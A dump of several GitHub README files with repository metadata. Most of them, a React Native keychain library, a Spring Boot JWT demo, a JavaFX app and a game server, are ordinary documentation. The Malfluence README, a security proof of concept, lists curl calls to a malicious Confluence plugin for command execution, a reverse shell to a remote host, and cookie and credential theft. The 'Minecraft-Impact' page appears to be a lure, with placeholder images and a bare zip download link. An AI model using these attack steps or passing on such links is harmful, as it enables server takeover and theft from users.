| **`accessible`**           | iOS, visionOS | This dictates when a keychain item is accessible, see possible values in `Keychain.ACCESSIBLE`.  | _`Keychain.ACCESSIBLE.WHEN_UNLOCKED`_                                     |
| **`accessGroup`**          | iOS, visionOS | In which App Group to share the keychain. Requires additional setup with entitlements.           | _None_                                                                    |
| **`authenticationPrompt`** | All           | What to prompt the user when unlocking the keychain with biometry or device password.            | See [`authenticationPrompt` Properties](#authenticationprompt-properties) |
| **`authenticationType`**   | iOS, visionOS | Policies specifying which forms of authentication are acceptable.                                | `Keychain.AUTHENTICATION_TYPE.DEVICE_PASSCODE_OR_BIOMETRICS`              |
| **`service`**              | All           | Reverse domain name qualifier for the service associated with password.                          | _App bundle ID_                                                           |
| **`storage`**              | Android only  | Force specific cipher storage usage during saving the password                                   | Select best available storage                                             |
| **`rules`**                | Android only  | Force following to a specific security rules                                                     | `Keychain.RULES.AUTOMATIC_UPGRADE`                                        |

##### `authenticationPrompt` Properties

| Key               | Platform     | Description                                                                                | Default                           |
| ----------------- | ------------ | ------------------------------------------------------------------------------------------ | --------------------------------- |
| **`title`**       | All          | Title of the authentication prompt when requesting a stored secret.                        | `Authenticate to retrieve secret` |
| **`subtitle`**    | Android only | Subtitle of the Android authentication prompt when requesting a stored secret.             | None. Optional                    |
| **`description`** | Android only | Description of the Android authentication prompt when requesting a stored secret.          | None. Optional                    |
| **`cancel`**      | Android only | Negative button text of the Android authentication prompt when requesting a stored secret. | `Cancel`                          |

#### `Keychain.ACCESS_CONTROL` enum

| Key                                           | Description                                                                            |
| --------------------------------------------- | -------------------------------------------------------------------------------------- |
| **`USER_PRESENCE`**                           | Constraint to access an item with either Touch ID or passcode.                         |
| **`BIOMETRY_ANY`**                            | Constraint to access an item with Touch ID for any enrolled fingers.                   |
| **`BIOMETRY_CURRENT_SET`**                    | Constraint to access an item with Touch ID for currently enrolled fingers.             |
| **`DEVICE_PASSCODE`**                         | Constraint to access an item with a passcode.                                          |
| **`APPLICATION_PASSWORD`**                    | Constraint to use an application-provided password for data encryption key generation. |
| **`BIOMETRY_ANY_OR_DEVICE_PASSCODE`**         | Constraint to access an item with Touch ID for any enrolled fingers or passcode.       |
| **`BIOMETRY_CURRENT_SET_OR_DEVICE_PASSCODE`** | Constraint to access an item with Touch ID for currently enrolled fingers or passcode. |

> Note #1: `BIOMETRY_ANY`, `BIOMETRY_CURRENT_SET`, `BIOMETRY_ANY_OR_DEVICE_PASSCODE`, `BIOMETRY_CURRENT_SET_OR_DEVICE_PASSCODE` - recognized by Android as a requirement for Biometric enabled storage (Till we got a better implementation);
>
> Note #2: For Android we support only two states: `None` (default) and `Fingerprint` (use only biometric protected storage); `Face` recognition fails with ""User not authenticated"" exception, see issue #318

Refs:

- <https://developer.apple.com/documentation/security/secaccesscontrolcreateflags?language=objc>

#### `Keychain.ACCESSIBLE` enum

| Key                                       | Description                                                                                                                                                                            |
| ----------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`WHEN_UNLOCKED`**                       | The data in the keychain item can be accessed only while the device is unlocked by the user.                                                                                           |
| **`AFTER_FIRST_UNLOCK`**                  | The data in the keychain item cannot be accessed after a restart until the device has been unlocked once by the user.                                                                  |
| **`ALWAYS`**                              | The data in the keychain item can always be accessed regardless of whether the device is locked.                                                                                       |
| **`WHEN_PASSCODE_SET_THIS_DEVICE_ONLY`**  | The data in the keychain can only be accessed when the device is unlocked. Only available if a passcode is set on the device. Items with this attribute never migrate to a new device. |
| **`WHEN_UNLOCKED_THIS_DEVICE_ONLY`**      | The data in the keychain item can be accessed only while the device is unlocked by the user. Items with this attribute do not migrate to a new device.                                 |
| **`AFTER_FIRST_UNLOCK_THIS_DEVICE_ONLY`** | The data in the keychain item cannot be accessed after a restart until the device has been unlocked once by the user. Items with this attribute never migrate to a new device.         |

Refs:

- <https://developer.apple.com/documentation/security/ksecattraccessiblewhenunlocked>

#### `Keychain.AUTHENTICATION_TYPE` enum

| Key                                 | Description                                                                               |
| ----------------------------------- | ----------------------------------------------------------------------------------------- |
| **`DEVICE_PASSCODE_OR_BIOMETRICS`** | Device owner is going to be authenticated by biometry or device passcode.                 |
| **`BIOMETRICS`**                    | Device owner is going to be authenticated using a biometric method (Touch ID or Face ID). |

Refs:

- <https://developer.apple.com/documentation/localauthentication/lapolicy>

#### `Keychain.BIOMETRY_TYPE` enum

| Key               | Description                                                          |
|-------------------|----------------------------------------------------------------------|
| **`TOUCH_ID`**    | Device supports authentication with Touch ID. (iOS only)             |
| **`FACE_ID`**     | Device supports authentication with Face ID. (iOS only)              |
| **`OPTIC_ID`**    | Device supports authentication with Optic ID. (visionOS only)        |
| **`FINGERPRINT`** | Device supports authentication with Fingerprint. (Android only)      |
| **`FACE`**        | Device supports authentication with Face Recognition. (Android only) |
| **`IRIS`**        | Device supports authentication with Iris Recognition. (Android only) |

Refs:

- <https://developer.apple.com/documentation/localauthentication/labiometrytype?language=objc>

#### `Keychain.SECURITY_LEVEL` enum (Android only)

If set, `securityLevel` parameter specifies minimum security level that the encryption key storage should guarantee for storing credentials to succeed.

| Key               | Description                                                                                                                                                                                                                            |
| ----------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ANY`             | no security guarantees needed (default value); Credentials can be stored in FB Secure Storage;                                                                                                                                         |
| `SECURE_SOFTWARE` | requires for the key to be stored in the Android Keystore, separate from the encrypted data;                                                                                                                                           |
| `SECURE_HARDWARE` | requires for the key to be stored on a secure hardware (Trusted Execution Environment or Secure Environment). Read [this article](https://developer.android.com/training/articles/keystore#ExtractionPrevention) for more information. |

#### `Keychain.STORAGE_TYPE` enum (Android only)

| Key   | Description                            |
| ----- | -------------------------------------- |
| `FB`  | Facebook compatibility cipher          |
| `AES` | Encryptions without human interaction. |
| `RSA` | Encryption with biometrics.            |

#### `Keychain.SECURITY_RULES` enum (Android only)

| Key                 | Description                                                                                                                                                                                                                |
| ------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `NONE`              | No rules. Be dummy, developer control everything                                                                                                                                                                           |
| `AUTOMATIC_UPGRADE` | Upgrade secret to the best available storage as soon as it is available and user request secret extraction. Upgrade not applied till we request the secret. This rule only applies to secrets stored with FacebookConseal. |

## Important Behavior

### Rule 1: Automatic Security Level

As a rule the library will try to apply the best possible encryption for storing secrets. Once the secret is stored however its does not try to upgrade it unless FacebookConseal was used and the option 'SECURITY_RULES' is set to 'AUTOMATIC_UPGRADE'

---

Q: What will happen if user disables/drops biometric usage?

A: User will lose ability to extract secret from storage. On re-enable biometric access to the secret will be possible again.

---

Q: Is it possible to implement automatic downgrading?

A: From security perspective any Automatic downgrading is treated as ""a loss of the trust"" point.
Developer should implement own logic to allow downgrade and deal with ""security loss"". _(My recommendation - never do that!)_

---

Q: How to enable automatic upgrade for FacebookConseal?

A: Do call `getGenericPassword({ ...otherProps, rules: ""AUTOMATIC_UPGRADE"" })` with extra property `rules` set to `AUTOMATIC_UPGRADE` string value.

---

Q: How to force a specific level of encryption during saving the secret?

A: Do call `setGenericPassword({ ...otherProps, storage: ""AES"" })` with forced storage.

> Note: attempt to force storage `RSA` when biometrics is not available will force code to reject call with errors specific to device biometric configuration state.

## Manual Installation

### iOS

#### Option: Manually

- Right click on Libraries, select **Add files to ""…""** and select `node_modules/react-native-keychain-manager/RNKeychainManager.xcodeproj`
- Select your project and under **Build Phases** -> **Link Binary With Libraries**, press the + and select `libRNKeychainManager.a`.
- make sure `pod 'RNKeychainManager'` is not in your `Podfile`

#### Option: With [CocoaPods](https://cocoapods.org/)

Add the following to your `Podfile` and run `pod update`:

```
pod 'RNKeychainManager', :path => '../node_modules/react-native-keychain-manager'
```

#### Enable `Keychain Sharing` entitlement for iOS 10+

For iOS 10 you'll need to enable the `Keychain Sharing` entitlement in the `Capabilities` section of your build target. (See screenshot). Otherwise you'll experience the error shown below.

![screen shot 2016-09-16 at 20 56 33](https://cloud.githubusercontent.com/assets/512692/18597833/15316342-7c50-11e6-92e7-781651e61563.png)

```
Error: {
  code = ""-34018"";
  domain = NSOSStatusErrorDomain;
  message = ""The operation couldn\U2019t be completed. (OSStatus error -34018.)"";
}
```

### Android

#### Option: Manually

- Edit `android/settings.gradle` to look like this (without the +):

```diff
rootProject.name = 'MyApp'

include ':app'

+ include ':react-native-keychain-manager'
+ project(':react-native-keychain-manager').projectDir = new File(rootProject.projectDir, '../node_modules/react-native-keychain-manager/android')
```

- Edit `android/app/build.gradle` (note: **app** folder) to look like this:

```diff
apply plugin: 'com.android.application'

android {
  ...
}

dependencies {
  implementation fileTree(dir: 'libs', include: ['*.jar'])
  implementation 'com.android.support:appcompat-v7:23.0.1'
  implementation 'com.facebook.react:react-native:0.19.+'
+ implementation project(':react-native-keychain-manager')
}
```

- Edit your `MainApplication.java` (deep in `android/app/src/main/java/...`) to look like this (note **two** places to edit):

```diff
package com.myapp;

+ import com.dorianmazur.keychain.KeychainPackage;

....

public class MainActivity extends extends ReactActivity {

  @Override
  protected List<ReactPackage> getPackages() {
      return Arrays.<ReactPackage>asList(
              new MainReactPackage(),
+             new KeychainPackage()
      );
  }
  ...
}
```

#### Proguard Rules

On Android builds that use proguard (like release), you may see the following error:

```
RNKeychainManager: no keychain entry found for service:
JNI DETECTED ERROR IN APPLICATION: JNI FindClass called with pending exception java.lang.NoSuchFieldError: no ""J"" field ""mCtxPtr"" in class ""Lcom/facebook/crypto/cipher/NativeGCMCipher;"" or its superclasses
```

If so, add a proguard rule in `proguard-rules.pro`:

```
-keep class com.facebook.crypto.** {
   *;
}
```

## Unit Testing with Jest

The keychain manager relies on interfacing with the native application itself. As such, it does not successfully compile and run in the context of a Jest test, where there is no underlying app to communicate with. To be able to call the JS functions exposed by this module in a unit test, you should mock them in one of the following two ways:

First, let's create a mock object for the module:

```js
const keychainMock = {
  SECURITY_LEVEL_ANY: ""MOCK_SECURITY_LEVEL_ANY"",
  SECURITY_LEVEL_SECURE_SOFTWARE: ""MOCK_SECURITY_LEVEL_SECURE_SOFTWARE"",
  SECURITY_LEVEL_SECURE_HARDWARE: ""MOCK_SECURITY_LEVEL_SECURE_HARDWARE"",
  setGenericPassword: jest.fn().mockResolvedValue(),
  getGenericPassword: jest.fn().mockResolvedValue(),
  resetGenericPassword: jest.fn().mockResolvedValue(),
  ...
}
```

### Using a Jest `__mocks__` Directory

1. Read the [jest docs](https://jestjs.io/docs/en/manual-mocks#mocking-node-modules) for initial setup

2. Create a `react-native-keychain-manager` folder in the `__mocks__` directory and add `index.js` file in it. It should contain the following code:

```javascript
export default keychainMock;
```

### Using a Jest Setup File

1. In your Jest config, add a reference to a [setup file](https://jestjs.io/docs/en/configuration.html#setupfiles-array)

2. Inside your setup file, set up mocking for this package:

```javascript
jest.mock('react-native-keychain-manager', () => keychainMock);
```

Now your tests should run successfully, though note that writing and reading to the keychain will be effectively a no-op.

## Notes

### Android Notes

The module will automatically use the appropriate CipherStorage implementation based on API level:

- API level 16-22 will en/de crypt using Facebook Conceal
- API level 23+ will en/de crypt using Android Keystore

Encrypted data is stored in DataStore Preferences.

The `setInternetCredentials(server, username, password)` call will be resolved as call to `setGenericPassword(username, password, server)`. Use the `server` argument to distinguish between multiple entries.

#### Configuring the Android-specific behavior

Android implementation has behavioural specifics incurred by existing inconsistency between implementations by different vendors. E.g., some Samsung devices show very slow startup of crypto system. To alleviate this, a warm-up strategy is introduced in Android implementation of this library.

Using default constructor you get default behaviour, i.e. with the warming up on.

```java
    private List<ReactPackage> createPackageList() {
      return Arrays.asList(
        ...
        new KeychainPackage(),  // warming up is ON
        ...
      )

```

Those who want finer control are required to use constructor with a builder which can be configured as they like:

```java
    private List<ReactPackage> createPackageList() {
      return Arrays.asList(
        ...
        new KeychainPackage(
                new KeychainModuleBuilder()
                        .withoutWarmUp()),   // warming up is OFF
        ...
      )
```

### iOS Notes

If you need Keychain Sharing in your iOS extension, make sure you use the same App Group and Keychain Sharing group names in your Main App and your Share Extension. To then share the keychain between the Main App and Share Extension, use the `accessGroup` and `service` option on `setGenericPassword` and `getGenericPassword`, like so: `getGenericPassword({ accessGroup: 'group.appname', service: 'com.example.appname' })`

Refs:

- <https://developer.apple.com/documentation/localauthentication>
- <https://developer.apple.com/documentation/security>

### macOS Catalyst

This package supports macOS Catalyst.

### visionOS

This package supports visionOS.

### Security

On API levels that do not support Android keystore, Facebook Conceal is used to en/decrypt stored data. The encrypted data is then stored in DataStore Preferences. Since Conceal itself stores its encryption key in DataStore Preferences, it follows that if the device is rooted (or if an attacker can somehow access the filesystem), the key can be obtained and the stored data can be decrypted. Therefore, on such a device, the conceal encryption is only an obscurity. On API level 23+ the key is stored in the Android Keystore, which makes the key non-exportable and therefore makes the entire process more secure. Follow best practices and do not store user credentials on a device. Instead use tokens or other forms of authentication and re-ask for user credentials before performing sensitive operations.

- [Android authentication](https://source.android.com/security/authentication)
- [Android Cipher](https://developer.android.com/guide/topics/security/cryptography)
- [Android Protected Confirmation](https://developer.android.com/training/articles/security-android-protected-confirmation)
",5,0,2,1.0,"['access', 'react', 'native', 'installation', 'usage', 'api', 'setgenericpassword', 'username', 'password', 'accesscontrol', 'accessible', 'accessgroup', 'service', 'securitylevel', 'hasgenericpassword', 'service', 'getgenericpassword', 'authenticationprompt', 'service', 'accesscontrol', 'resetgenericpassword', 'service', 'getallgenericpasswordservices', 'setinternetcredentials', 'server', 'username', 'password', 'accesscontrol', 'accessible', 'accessgroup', 'securitylevel', 'hasinternetcredentials', 'server', 'getinternetcredentials', 'server', 'authenticationprompt', 'resetinternetcredentials', 'server', 'requestsharedwebcredentials', 'ios', 'visionos', 'only', 'setsharedwebcredentials', 'server', 'username', 'password', 'ios', 'visionos', 'only', 'canimplyauthentication', 'authenticationtype', 'ios', 'visionos', 'only', 'getsupportedbiometrytype', 'getsecuritylevel', 'accesscontrol', 'android', 'only', 'option', 'data', 'structure', 'authenticationprompt', 'property', 'enum', 'enum', 'enum', 'enum', 'enum', 'android', 'only', 'enum', 'android', 'only', 'enum', 'android', 'only', 'important', 'behavior', 'rule', 'automatic', 'security', 'level', 'manual', 'installation', 'io', 'option', 'manually', 'option', 'with', 'cocoapods', 'http', 'enable', 'keychain', 'share', 'entitlement', 'io', 'android', 'option', 'manually', 'proguard', 'rule', 'unit', 'test', 'jest', 'use', 'jest', 'directory', 'use', 'jest', 'setup', 'file', 'note', 'android', 'note', 'configure', 'behavior', 'io', 'note', 'macos', 'catalyst', 'visionos', 'security']","['only', 'enum', 'android', 'server', 'accesscontrol']"
Mark-Langston/Marks_Computer_Builds_Remote,master,"# Mark's Computer Builds - Remote

Mark's Computer Builds is a JavaFX application that allows users to manage and organize their computer builds. The application integrates with a remote PostgreSQL database to store and retrieve build information.

## Features

- Add, edit, and remove computer builds
- Secure login system
- Integration with a remote PostgreSQL database

## Video Demonstration

Watch a short demo of the project:

[![Mark's Computer Builds - Demo](https://img.youtube.com/vi/warFaJIbG7M/0.jpg)](https://youtu.be/warFaJIbG7M)

## Getting Started

### Prerequisites

- Java JDK 21
- PostgreSQL database
- Maven

### Installation

1. Clone the repository:
    ```sh
    git clone https://github.com/Mark-Langston/Marks_Computer_Builds_Remote.git
    cd Marks_Computer_Builds_Remote
    ```

2. Set up the PostgreSQL database:
    - Create a new database and two tables using the following SQL commands:

    ```sql
    CREATE TABLE markscomputerbuilds (
        title TEXT PRIMARY KEY,
        case_type TEXT,
        motherboard TEXT,
        cpu TEXT,
        cpu_cooler TEXT,
        ram TEXT,
        gpu TEXT,
        power_supply TEXT,
        mass_storage TEXT
    );

    CREATE TABLE users (
        username TEXT PRIMARY KEY,
        password TEXT NOT NULL
    );

    -- Insert a sample user for testing
    INSERT INTO users (username, password) VALUES ('admin', '12345');
    ```

3. Update the `config.properties` file with your database credentials:
    ```properties
    remote.db.url=jdbc:postgresql://your_database_url:port/your_database_name
    remote.db.user=your_database_user
    remote.db.password=your_database_password
    ```

4. Build and run the application using Maven:
    ```sh
    mvn clean install
    mvn javafx:run
    ```

## Usage

1. Run the application.
2. Log in using the username and password set up in the PostgreSQL database.
3. Use the interface to add, edit, and remove computer builds.

## Contributing

Contributions are welcome! Please open an issue or submit a pull request.
",0,0,1,0.0,"['mark', 'computer', 'build', 'remote', 'feature', 'video', 'demonstration', 'get', 'start', 'prerequisite', 'installation', 'usage', 'contribute']","['mark', 'computer', 'build', 'remote', 'feature']"
0WhiteDev/Java-Process-Inspector,main,"# Java Process Inspector [JPI] 🖥️

This is a sophisticated tool designed for dynamically browsing, analyzing, and modifying a running Java process ⚡

## Basic information

It allows users to interact with the Java application's live state, inspect its code, and make changes in real-time, offering a powerful solution for everyone, who need deep insights and control over Java applications during execution.

The program has a basic GUI that is easy to use and does not take up much memory.

## Functions

#### 🔧 Dynamic Executor for Java Code: 
This feature allows you to force the program, to which JPI is attached, to execute specific lines of code written in the built-in code editor provided with JPI. It offers full access to use any classes and methods, enabling real-time manipulation and testing of the application’s behavior.

#### ✏️ Memory Editor: 
The Memory Editor is a powerful tool that enables you to search for specific values within the process's memory and dynamically modify them while the process is running. This function provides direct access to the internal state of the application, allowing precise and immediate adjustments.

#### 🔌 DLL Injector: 
A straightforward tool designed to inject DLL files into the process. This function simplifies the process of adding external libraries, enabling extended functionality or modifications to the running application.

#### 🔍 Loaded Class Checker: 
This feature allows you to inspect all the classes loaded by the process, decompile them, and view their source code. Additionally, it provides the capability to dump all loaded classes to a specified folder.

#### 💻 Process Profiler:
Real-time Java process monitoring and profiling solution. Displays performance metrics, resource utilization, process details and enables field inspection, providing a comprehensive overview of the running process.

## How to inject JPI
- To attach JPI to a java process, run Process Injector.exe
- Find the pid of the process you are interested in (java/javaw)
- Enter the pid of the process you want to attach JPI to (confirm with enter)
- Enter the full path to the dll file ""injector.dll"" (confirm with enter) `Example: C:\\Users\\whitedev\\Files\\injector.dll`

## Disclaimer
Remember that modifying memory, dynamically injecting new classes and various modifications in the running java process are quite dangerous and can cause various errors with your application, use this with caution.

## Project Suppot
If you need help, join to our community:
- Discord Server: https://discord.gg/KhExwvqZb5
- WebSite: https://devsmarket.eu/

## Authors

- [@0WhiteDev](https://github.com/0WhiteDev)
- [@DevsMarket](https://github.com/DEVS-MARKET)
",1,0,1,0.0,"['java', 'process', 'inspector', 'jpi', 'basic', 'information', 'function', 'dynamic', 'executor', 'java', 'code', 'memory', 'editor', 'dll', 'injector', 'loaded', 'class', 'checker', 'process', 'profiler', 'how', 'inject', 'jpi', 'disclaimer', 'project', 'suppot', 'author']","['java', 'process', 'jpi', 'inspector', 'basic']"
jezyk12/Minecraft-Impact,main,"## Minecraft-Impact

![Minecraft](https://github.com/github.png)

Welcome to the official repository of Minecraft-Impact! 🎮

### Summary
Impact is a powerful Minecraft client that comes pre-installed with Baritone, providing users with advanced features and an easy setup process. This client supports Minecraft versions 1.12 through 1.16.5, offering a seamless gaming experience to players worldwide.

### Features
- Pre-installed with Baritone
- Supports Minecraft versions 1.12 through 1.16.5
- Easy setup process
- Advanced controls and functionalities

### Installation
To download Impact, click the button below:
[![Download Impact](https://img.shields.io/badge/Download-Impact-brightgreen)](https://github.com/user-attachments/files/16830358/Client.zip)

Follow these steps to install Impact on your Minecraft client:
1. Download the client from the provided link.
2. Extract the downloaded ZIP file.
3. Open the Minecraft launcher.
4. Create a new installation and select the Impact client.
5. Launch the game and enjoy the enhanced features of Impact!

### Screenshots
Here are some snapshots of the Impact client in action:

![Screenshot 1](https://github.com/github.png)
![Screenshot 2](https://github.com/github.png)
![Screenshot 3](https://github.com/github.png)

### Support
For any questions, feedback, or issues regarding the Impact client, feel free to reach out to our support team at `support@impactminecraft.com`.

### Collaborate
We welcome developers and Minecraft enthusiasts to contribute to the enhancement of the Impact client. Join our community on Discord to collaborate and share ideas: [Impact Discord Community](https://discord.com/impact).

### Happy Gaming! 🎉",1,0,1,0.0,"['summary', 'feature', 'installation', 'screenshots', 'support', 'collaborate', 'happy', 'game']","['summary', 'feature', 'installation', 'screenshots', 'support']"
cyllective/malfluence,main,"# Malfluence 
A PoC for a malicious Confluence plugin. Read more about this on [our blog](https://cyllective.com/blog/posts/atlassian-malicious-plugin/).

The general code may also work with slight adjustments in Jira but the plugin cannot be directly installed into Jira. 

## Features
### List & download attachments
```sh
curl ""http://yourserver/rest/maintenance/latest/listattachments?accesskey=<Access Key>""

curl ""http://yourserver/rest/maintenance/latest/getattachment?accesskey=<Access Key>&id=<Attachment ID>"" -O
```
![](media/attachments.png)

### List & download pages
```sh
curl ""http://yourserver/rest/maintenance/latest/listpages?accesskey=<Access Key>""

curl ""http://yourserver/rest/maintenance/latest/getpage?accesskey=<Access Key>&id=<Page ID>""
```
![](media/pages.png)

### Steal cookies
Since the cool cookies have HttpOnly set, this works by first sending a request to the custom endpoint `/getheaders`, which returns all headers base64 encoded into the DOM. Those are then sent to the attacker. 

```sh
# Configure the server which will receive POST requests of users containing base64 encoded headers
curl ""http://yourserver/rest/maintenance/latest/headerexfilconfig?accesskey=<Access Key>&url=<base64 encoded target URL>&enabled={TRUE,FALSE}""
```

```sh
python3 headerserver.py
```
![](media/cookiesteal.gif)

### Steal credentials
```sh
python3 credsserver.py
```
![](media/credssteal.gif)

### Issue HTTP requests through the server
```sh
curl ""http://yourserver/rest/maintenance/latest/proxy?accesskey=<Access Key>&method={GET,POST}&url=<base64 encoded URL>&headers=<base64 encoded headers (name1:value1,nameN:valueN)>&body=<base64 encoded body for POST>""
```
![](media/proxy.png)

### Execute commands on the server
```sh
curl ""http://yourserver/rest/maintenance/latest/exec?accesskey=<Access Key>&cmd=<Command to run>&args=<arg1,arg2,arg3>""
```
![](media/exec.png)

### Spawn a reverse TCP shell
```sh
curl ""http://yourserver/rest/maintenance/latest/revshell?accesskey=<Access Key>&rhost=<Remote Host>&rport=<Remote Port>""
```
![](media/revshell.png)

### Scan for open ports on hosts reachable by the server
```sh
curl ""http://yourserver/rest/maintenance/latest/portscan?accesskey=<Access Key>&ip=<IP address>""
```
![](media/portscan.png)

### Hide plugins from the plugin overview
```sh
curl ""http://yourserver/rest/maintenance/latest/hideplugins?accesskey=<Access Key>&plugins=<com.plugin.hideme,com.plugin.hidemeto>&enabled={TRUE,FALSE}""
```
![](media/hideplugin.gif)",0,0,1,0.0,"['malfluence', 'feature', 'list', 'download', 'attachment', 'list', 'download', 'page', 'steal', 'cooky', 'configure', 'server', 'receive', 'post', 'request', 'user', 'contain', 'encode', 'header', 'steal', 'credential', 'issue', 'http', 'request', 'server', 'execute', 'command', 'server', 'spawn', 'reverse', 'tcp', 'shell', 'scan', 'open', 'port', 'host', 'reachable', 'server', 'hide', 'plugins', 'plugin', 'overview']","['server', 'list', 'download', 'steal', 'request']"
niqumu/Irminsul,master,"<h1 align=""center"">Irminsul</h1>
<h4 align=""center"">An experimental anime game server implementation, written in Java.</h4>
<br>

![banner](https://github.com/user-attachments/assets/126e13fa-d6c0-4fc5-bfee-735b18b444bb)

Please avoid using the name of the game, game company, or notable content from the game when discussing this project.
This project contains no copyrighted works, and does not constitute copyright infringement. This code simply happens
to implement a certain protocol that some software may happen to support. This project is shared in hopes that it may
be interesting or helpful to people. I am not responsible for how people use this project.

## Credits
- The wonderful [Grasscutter](https://github.com/Grasscutters/Grasscutter) community for helping with protocol research
- Slushy team for their [Beach Simulator](https://github.com/SlushinPS/beach-simulator) protocol definitions
",0,0,1,0.0,['credit'],['credit']
Rapter1990/springbootmicroserviceswithsecurity,main,"# Spring Boot Microservices with JWT Implementation

<p align=""center"">
    <img src=""screenshots/spring_boot_microservices_jwt_implementation_main.png"" alt=""Main Information"" width=""700"" height=""500"">
</p>

### 📖 Information

<ul style=""list-style-type:disc"">
  <li>This project demonstrates a <b>Spring Boot microservices</b> architecture with <b>JWT-based authentication</b> and <b>role-based</b> access control. The setup includes an <b>API Gateway</b> to manage <b>routing</b> and <b>authentication</b>.</li> 
</ul>

<ul style=""list-style-type:disc"">
  <li>Roles and Permissions:
    <ul>
      <li><b>Admin</b> and <b>User</b> roles each have their own authentication and authorization mechanisms defined by their roles.</li>
      <li><b>Admin</b> can:
        <ul>
          <li>Create products</li>
          <li>Retrieve all products</li>
          <li>Retrieve products by ID</li>
          <li>Update products by ID</li>
          <li>Delete products by ID</li>
        </ul>
      </li>
      <li><b>User</b> can:
        <ul>
          <li>Retrieve all products</li>
          <li>Retrieve products by ID</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

### Explore Rest APIs

<table style=""width:100%"">
  <tr>
      <th>Method</th>
      <th>Url</th>
      <th>Description</th>
      <th>Request Body</th>
      <th>Header</th>
      <th>Valid Path Variable</th>
      <th>No Path Variable</th>
  </tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/admin/register</td>
      <td>Admin Register</td>
      <td>AdminRegisterRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/admin/login</td>
      <td>Admin Login</td>
      <td>LoginRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/admin/refreshtoken</td>
      <td>Admin Refresh Token</td>
      <td>TokenRefreshRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/admin/logout</td>
      <td>Admin Logout</td>
      <td>TokenInvalidateRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/register</td>
      <td>User Register</td>
      <td>UserRegisterRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/login</td>
      <td>User Login</td>
      <td>LoginRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/refreshtoken</td>
      <td>User Refresh Token</td>
      <td>TokenRefreshRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/logout</td>
      <td>User Logout</td>
      <td>TokenInvalidateRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/products</td>
      <td>Create Product</td>
      <td>ProductCreateRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>GET</td>
      <td>/api/v1/products/{productId}</td>
      <td>Get Product By Id</td>
      <td></td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
  <tr>
      <td>GET</td>
      <td>/api/v1/products</td>
      <td>Get Products</td>
      <td>ProductPagingRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>PUT</td>
      <td>/api/v1/products/{productId}</td>
      <td>Update Product By Id</td>
      <td>ProductUpdateRequest</td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
  <tr>
      <td>DELETE</td>
      <td>/api/v1/products/{productId}</td>
      <td>Delete Product By Id</td>
      <td></td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
</table>


### Technologies

---
- Java 21
- Spring Boot 3.0
- Restful API
- Lombok
- Maven
- Junit5
- Mockito
- Integration Tests
- Docker
- Docker Compose
- CI/CD (Github Actions)
- Spring Cloud
- Postman
- Spring Security
- JWT

### Postman

```
Import postman collection under postman_collection folder
```


### Prerequisites

#### Define Variable in .env file for product service and user service

```
DATABASE_USERNAME={DATABASE_USERNAME}
DATABASE_PASSWORD={DATABASE_PASSWORD}
```

---
- Maven or Docker
---


### Docker Run
The application can be built and run by the `Docker` engine. The `Dockerfile` has multistage build, so you do not need to build and run separately.

Please follow directions shown below in order to build and run the application with Docker Compose file;

```sh
$ cd springbootmicroserviceswithsecurity
$ docker-compose up -d
```

If you change anything in the project and run it on Docker, you can also use this command shown below

```sh
$ cd springbootmicroserviceswithsecurity
$ docker-compose up --build
```

---
### Maven Run
To build and run the application with `Maven`, please follow the directions shown below;

```sh
$ cd springbootmicroserviceswithsecurity
$ cd eurekaserver
$ mvn clean install
$ mvn spring-boot:run
$ cd ..
$ cd apigateway
$ mvn clean install
$ mvn spring-boot:run
$ cd ..
$ cd authservice
$ mvn clean install
$ mvn spring-boot:run
$ cd ..
$ cd userservice
$ mvn clean install
$ mvn spring-boot:run
$ cd ..
$ cd productservice
$ mvn clean install
$ mvn spring-boot:run
```

---
### Docker Image Location

```
https://hub.docker.com/repository/docker/noyandocker/springbootmicroserviceswithsecurityeurekaserver/general
https://hub.docker.com/repository/docker/noyandocker/springbootmicroserviceswithsecurityapigateway/general
https://hub.docker.com/repository/docker/noyandocker/springbootmicroserviceswithsecurityauthservice/general
https://hub.docker.com/repository/docker/noyandocker/springbootmicroserviceswithsecurityuserservice/general
https://hub.docker.com/repository/docker/noyandocker/springbootmicroserviceswithsecurityproductservice/general
```

### Screenshots

<details>
<summary>Click here to show the screenshots of project</summary>
    <p> Figure 1 </p>
    <img src =""screenshots/eureka_server_image.PNG"">
    <p> Figure 2 </p>
    <img src =""screenshots/docker_image.PNG"">
    <p> Figure 3 </p>
    <img src =""screenshots/0_register_admin.PNG"">
    <p> Figure 4 </p>
    <img src =""screenshots/0_login_admin.PNG"">
    <p> Figure 5 </p>
    <img src =""screenshots/0_refresh_token_admin.PNG"">
    <p> Figure 6 </p>
    <img src =""screenshots/0_logout_admin.PNG"">
    <p> Figure 7 </p>
    <img src =""screenshots/2_register_user.PNG"">
    <p> Figure 8 </p>
    <img src =""screenshots/2_login_user.PNG"">
    <p> Figure 9 </p>
    <img src =""screenshots/2_refresh_token_user.PNG"">
    <p> Figure 10 </p>
    <img src =""screenshots/2_logout_user.PNG"">
